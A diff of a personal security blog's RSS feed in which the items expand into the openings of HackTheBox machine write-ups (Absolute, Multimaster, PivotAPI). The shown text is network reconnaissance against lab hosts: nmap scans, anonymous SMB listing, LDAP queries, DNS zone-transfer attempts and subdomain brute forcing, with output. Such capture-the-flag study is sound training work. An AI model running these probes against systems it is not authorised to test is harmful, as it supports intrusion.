@@ -1,1 +1,1464 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>As-Rep-Roast on Personal Blog</title><link>https://0x13hrafnulf.github.io/tags/as-rep-roast/</link><description>Recent content in As-Rep-Roast on Personal Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 04 Oct 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://0x13hrafnulf.github.io/tags/as-rep-roast/index.xml" rel="self" type="application/rss+xml"/><item><title>[HTB] Machine: Absolute</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/absolute/</link><pubDate>Wed, 04 Oct 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/absolute/</guid><description>Absolute Enumeration nmap └─$ nmap -Pn -p- 10.10.11.181 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 19:44 BST Nmap scan report for 10.10.11.181 (10.10.11.181) Host is up (0.10s latency). Not shown: 65509 closed ports PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49686/tcp open unknown 49692/tcp open unknown 49699/tcp open unknown 49703/tcp open unknown └─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.</description></item><item><title>[HTB] Machine: Multimaster</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/multimaster/</link><pubDate>Wed, 04 Oct 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/multimaster/</guid><description>Multimaster Enumeration nmap └─$ nmap -Pn -p- 10.10.10.179 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 19:46 BST Nmap scan report for 10.10.10.179 (10.10.10.179) Host is up (0.13s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 5985/tcp open wsman 49666/tcp open unknown 49667/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49678/tcp open unknown 49698/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 45.</description></item><item><title>[HTB] Machine: PivotAPI</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/pivotapi/</link><pubDate>Wed, 04 Oct 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/pivotapi/</guid><description>PivotAPI Enumeration nmap └─$ nmap -Pn -p- 10.10.10.240 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:10 BST Nmap scan report for 10.10.10.240 (10.10.10.240) Host is up (0.10s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49708/tcp open unknown 52843/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 65.</description></item><item><title>[HTB] Machine: Tentacle</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/tentacle/</link><pubDate>Wed, 27 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/tentacle/</guid><description>Tentacle Enumeration nmap └─$ nmap -Pn -p- 10.10.10.224 -T4 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-26 20:09 BST Nmap scan report for 10.10.10.224 (10.10.10.224) Host is up (0.093s latency). Not shown: 65495 filtered tcp ports (no-response), 36 filtered tcp ports (host-unreach) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 88/tcp open kerberos-sec 3128/tcp open squid-http Nmap done: 1 IP address (1 host up) scanned in 39.58 seconds └─$ nmap -Pn -p22,53,88,3128 -sC -sV 10.</description></item><item><title>[HTB] Machine: Blackfield</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/blackfield/</link><pubDate>Sun, 17 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/blackfield/</guid><description>Blackfield Enumeration nmap └─$ nmap -Pn -p- 10.10.10.192 --min-rate 5000 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 18:54 BST Nmap scan report for 10.10.10.192 (10.10.10.192) Host is up (0.11s latency). Not shown: 65526 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 3268/tcp open globalcatLDAP 5985/tcp open wsman Nmap done: 1 IP address (1 host up) scanned in 35.</description></item><item><title>[HTB] Machine: Sauna</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/sauna/</link><pubDate>Mon, 26 Jun 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/sauna/</guid><description>Sauna Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.175 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-28 17:36 BST Nmap scan report for 10.10.10.175 (10.10.10.175) Host is up (0.11s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-28 23:35:53Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.</description></item><item><title>[HTB] Machine: Forest</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/forest/</link><pubDate>Sat, 24 Jun 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/forest/</guid><description>Forest Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.161 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 16:32 BST Nmap scan report for 10.10.10.161 (10.10.10.161) Host is up (0.15s latency). Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-26 15:39:16Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>As-Rep-Roast on Personal Blog</title><link>https://0x13hrafnulf.github.io/tags/as-rep-roast/</link><description>Recent content in As-Rep-Roast on Personal Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 04 Oct 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://0x13hrafnulf.github.io/tags/as-rep-roast/index.xml" rel="self" type="application/rss+xml"/><item><title>[HTB] Machine: Absolute</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/absolute/</link><pubDate>Wed, 04 Oct 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/absolute/</guid><description>&lt;h1 id="absolute">Absolute&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.11.181 --min-rate 10000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 19:44 BST
+Nmap scan report for 10.10.11.181 (10.10.11.181)
+Host is up (0.10s latency).
+Not shown: 65509 closed ports
+PORT STATE SERVICE
+53/tcp open domain
+80/tcp open http
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+464/tcp open kpasswd5
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+3268/tcp open globalcatLDAP
+3269/tcp open globalcatLDAPssl
+5985/tcp open wsman
+9389/tcp open adws
+47001/tcp open winrm
+49664/tcp open unknown
+49665/tcp open unknown
+49666/tcp open unknown
+49667/tcp open unknown
+49673/tcp open unknown
+49674/tcp open unknown
+49675/tcp open unknown
+49686/tcp open unknown
+49692/tcp open unknown
+49699/tcp open unknown
+49703/tcp open unknown
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.11.181 --min-rate 10000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 19:36 BST
+Nmap scan report for 10.10.11.181 (10.10.11.181)
+Host is up (0.18s latency).
+PORT STATE SERVICE VERSION
+53/tcp open domain Simple DNS Plus
+80/tcp open http Microsoft IIS httpd 10.0
+| http-methods:
+|_ Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Absolute
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-04 01:35:57Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-10-04T01:36:48+00:00; +6h59m17s from scanner time.
+| ssl-cert: Subject: commonName=dc.absolute.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:dc.absolute.htb
+| Not valid before: 2023-07-17T21:11:52
+|_Not valid after: 2024-07-16T21:11:52
+445/tcp open microsoft-ds?
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-10-04T01:36:49+00:00; +6h59m17s from scanner time.
+| ssl-cert: Subject: commonName=dc.absolute.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:dc.absolute.htb
+| Not valid before: 2023-07-17T21:11:52
+|_Not valid after: 2024-07-16T21:11:52
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.absolute.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:dc.absolute.htb
+| Not valid before: 2023-07-17T21:11:52
+|_Not valid after: 2024-07-16T21:11:52
+|_ssl-date: 2023-10-04T01:36:48+00:00; +6h59m17s from scanner time.
+3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-10-04T01:36:49+00:00; +6h59m17s from scanner time.
+| ssl-cert: Subject: commonName=dc.absolute.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:dc.absolute.htb
+| Not valid before: 2023-07-17T21:11:52
+|_Not valid after: 2024-07-16T21:11:52
+5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp open mc-nmf .NET Message Framing
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-security-mode:
+| 3:1:1:
+|_ Message signing enabled and required
+| smb2-time:
+| date: 2023-10-04T01:36:42
+|_ start_date: N/A
+|_clock-skew: mean: 6h59m16s, deviation: 0s, median: 6h59m16s
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.79 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.11.181
+Anonymous login successful
+Sharename Type Comment
+--------- ---- -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>ldap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://dc.absolute.htb -x -s base namingcontexts
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;&amp;gt; (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts
+#
+#
+dn:
+namingcontexts: DC=absolute,DC=htb
+namingcontexts: CN=Configuration,DC=absolute,DC=htb
+namingcontexts: CN=Schema,CN=Configuration,DC=absolute,DC=htb
+namingcontexts: DC=DomainDnsZones,DC=absolute,DC=htb
+namingcontexts: DC=ForestDnsZones,DC=absolute,DC=htb
+# search result
+search: 2
+result: 0 Success
+# numResponses: 2
+# numEntries: 1
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://dc.absolute.htb -x -b &amp;#34;DC=absolute,DC=htb&amp;#34;
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;DC=absolute,DC=htb&amp;gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
+tion a successful bind must be completed on the connection., data 0, v4563
+# numResponses: 1
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>dns&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ dig absolute.htb @dc.absolute.htb
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.16-1-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; absolute.htb @dc.absolute.htb
+;; global options: +cmd
+;; Got answer:
+;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 38236
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4000
+;; QUESTION SECTION:
+;absolute.htb. IN A
+;; ANSWER SECTION:
+absolute.htb. 600 IN A 10.10.11.181
+;; Query time: 103 msec
+;; SERVER: 10.10.11.181#53(dc.absolute.htb) (UDP)
+;; WHEN: Wed Oct 04 17:29:51 BST 2023
+;; MSG SIZE rcvd: 57
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ dig axfr absolute.htb @dc.absolute.htb
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.16-1-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr absolute.htb @dc.absolute.htb
+;; global options: +cmd
+; Transfer failed.
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>dnsenum&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ dnsenum --dnsserver 10.10.11.181 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt absolute.htb
+dnsenum VERSION:1.2.6
+----- absolute.htb -----
+Host&amp;#39;s addresses:
+__________________
+absolute.htb. 600 IN A 10.10.11.181
+Name Servers:
+______________
+dc.absolute.htb. 1200 IN A 10.10.11.181
+Mail (MX) Servers:
+___________________
+Trying Zone Transfers and getting Bind Versions:
+_________________________________________________
+unresolvable name: dc.absolute.htb at /usr/bin/dnsenum line 900.
+Trying Zone Transfer for absolute.htb on dc.absolute.htb ...
+AXFR record query failed: no nameservers
+Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:
+________________________________________________________________________________________
+dc.absolute.htb. 1200 IN A 10.10.11.181
+domaindnszones.absolute.htb. 600 IN A 10.10.11.181
+forestdnszones.absolute.htb. 600 IN A 10.10.11.181
+absolute.htb class C netranges:
+________________________________
+Performing reverse lookup on 0 ip addresses:
+_____________________________________________
+0 results out of 0 IP addresses.
+absolute.htb ip blocks:
+________________________
+done.
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Web Server&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/absolute/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Multimaster</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/multimaster/</link><pubDate>Wed, 04 Oct 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/multimaster/</guid><description>&lt;h1 id="multimaster">Multimaster&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.179 --min-rate 10000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 19:46 BST
+Nmap scan report for 10.10.10.179 (10.10.10.179)
+Host is up (0.13s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT STATE SERVICE
+53/tcp open domain
+80/tcp open http
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+3268/tcp open globalcatLDAP
+3269/tcp open globalcatLDAPssl
+3389/tcp open ms-wbt-server
+5985/tcp open wsman
+49666/tcp open unknown
+49667/tcp open unknown
+49674/tcp open unknown
+49675/tcp open unknown
+49678/tcp open unknown
+49698/tcp open unknown
+Nmap done: 1 IP address (1 host up) scanned in 45.14 seconds
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.10.179 --min-rate 10000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 19:46 BST
+Nmap scan report for 10.10.10.179 (10.10.10.179)
+Host is up (0.56s latency).
+PORT STATE SERVICE VERSION
+53/tcp open domain Simple DNS Plus
+80/tcp open http Microsoft IIS httpd 10.0
+| http-methods:
+|_ Potentially risky methods: TRACE
+|_http-title: 403 - Forbidden: Access is denied.
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-08 18:52:31Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+445/tcp open Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+3269/tcp open tcpwrapped
+5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open mc-nmf .NET Message Framing
+Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: mean: 2h26m16s, deviation: 4h02m30s, median: 6m16s
+| smb-security-mode:
+| account_used: &amp;lt;blank&amp;gt;
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: required
+| smb2-time:
+| date: 2023-10-08T18:52:41
+|_ start_date: 2023-10-08T18:50:58
+| smb-os-discovery:
+| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+| Computer name: MULTIMASTER
+| NetBIOS computer name: MULTIMASTER\x00
+| Domain name: MEGACORP.LOCAL
+| Forest name: MEGACORP.LOCAL
+| FQDN: MULTIMASTER.MEGACORP.LOCAL
+|_ System time: 2023-10-08T11:52:40-07:00
+| smb2-security-mode:
+| 3:1:1:
+|_ Message signing enabled and required
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.26 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.10.179
+Anonymous login successful
+Sharename Type Comment
+--------- ---- -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.179 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Web Server&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/multimaster/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: PivotAPI</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/pivotapi/</link><pubDate>Wed, 04 Oct 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/pivotapi/</guid><description>&lt;h1 id="pivotapi">PivotAPI&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.240 --min-rate 5000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:10 BST
+Nmap scan report for 10.10.10.240 (10.10.10.240)
+Host is up (0.10s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+PORT STATE SERVICE
+21/tcp open ftp
+22/tcp open ssh
+53/tcp open domain
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+464/tcp open kpasswd5
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+1433/tcp open ms-sql-s
+3268/tcp open globalcatLDAP
+3269/tcp open globalcatLDAPssl
+9389/tcp open adws
+49667/tcp open unknown
+49673/tcp open unknown
+49674/tcp open unknown
+49708/tcp open unknown
+52843/tcp open unknown
+Nmap done: 1 IP address (1 host up) scanned in 65.93 seconds
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p21,22,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389 -sC -sV 10.10.10.240 --min-rate 5000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:12 BST
+Nmap scan report for 10.10.10.240 (10.10.10.240)
+Host is up (0.10s latency).
+PORT STATE SERVICE VERSION
+21/tcp open ftp Microsoft ftpd
+| ftp-syst:
+|_ SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-19-21 03:06PM 103106 10.1.1.414.6453.pdf
+| 02-19-21 03:06PM 656029 28475-linux-stack-based-buffer-overflows.pdf
+| 02-19-21 12:55PM 1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
+| 02-19-21 03:06PM 1018160 ExploitingSoftware-Ch07.pdf
+| 08-08-20 01:18PM 219091 notes1.pdf
+| 08-08-20 01:34PM 279445 notes2.pdf
+| 08-08-20 01:41PM 105 README.txt
+|_02-19-21 03:06PM 1301120 RHUL-MA-2009-06.pdf
+22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)
+| ssh-hostkey:
+| 3072 fa:19:bb:8d:b6:b6:fb:97:7e:17:80:f5:df:fd:7f:d2 (RSA)
+| 256 44:d0:8b:cc:0a:4e:cd:2b:de:e8:3a:6e:ae:65:dc:10 (ECDSA)
+|_ 256 93:bd:b6:e2:36:ce:72:45:6c:1d:46:60:dd:08:6a:44 (ED25519)
+53/tcp open domain Simple DNS Plus
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-05 19:12:42Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp filtered ldap
+445/tcp open microsoft-ds?
+464/tcp filtered kpasswd5
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
+1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info:
+| 10.10.10.240:1433:
+| Target_Name: LICORDEBELLOTA
+| NetBIOS_Domain_Name: LICORDEBELLOTA
+| NetBIOS_Computer_Name: PIVOTAPI
+| DNS_Domain_Name: LicorDeBellota.htb
+| DNS_Computer_Name: PivotAPI.LicorDeBellota.htb
+| DNS_Tree_Name: LicorDeBellota.htb
+|_ Product_Version: 10.0.17763
+| ms-sql-info:
+| 10.10.10.240:1433:
+| Version:
+| name: Microsoft SQL Server 2019 RTM
+| number: 15.00.2000.00
+| Product: Microsoft SQL Server 2019
+| Service pack level: RTM
+| Post-SP patches applied: false
+|_ TCP port: 1433
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2023-10-05T19:05:41
+|_Not valid after: 2053-10-05T19:05:41
+|_ssl-date: 2023-10-05T19:13:30+00:00; -7h00m01s from scanner time.
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
+3269/tcp open tcpwrapped
+9389/tcp open mc-nmf .NET Message Framing
+Service Info: Host: PIVOTAPI; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-security-mode:
+| 3:1:1:
+|_ Message signing enabled and required
+| smb2-time:
+| date: 2023-10-05T19:12:54
+|_ start_date: N/A
+|_clock-skew: mean: -7h00m01s, deviation: 0s, median: -7h00m01s
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 58.10 seconds
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.10.240
+Anonymous login successful
+Sharename Type Comment
+--------- ---- -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.240 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>dns&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ dig axfr LicorDeBellota.htb @PivotAPI.LicorDeBellota.htb
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.19.17-1-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr LicorDeBellota.htb @PivotAPI.LicorDeBellota.htb
+;; global options: +cmd
+; Transfer failed.
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>ldapsearch&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ ldapsearch -H ldap://LicorDeBellota.htb -x -s base namingcontexts
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;&amp;gt; (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts
+#
+#
+dn:
+namingcontexts: DC=LicorDeBellota,DC=htb
+namingcontexts: CN=Configuration,DC=LicorDeBellota,DC=htb
+namingcontexts: CN=Schema,CN=Configuration,DC=LicorDeBellota,DC=htb
+namingcontexts: DC=DomainDnsZones,DC=LicorDeBellota,DC=htb
+namingcontexts: DC=ForestDnsZones,DC=LicorDeBellota,DC=htb
+# search result
+search: 2
+result: 0 Success
+# numResponses: 2
+# numEntries: 1
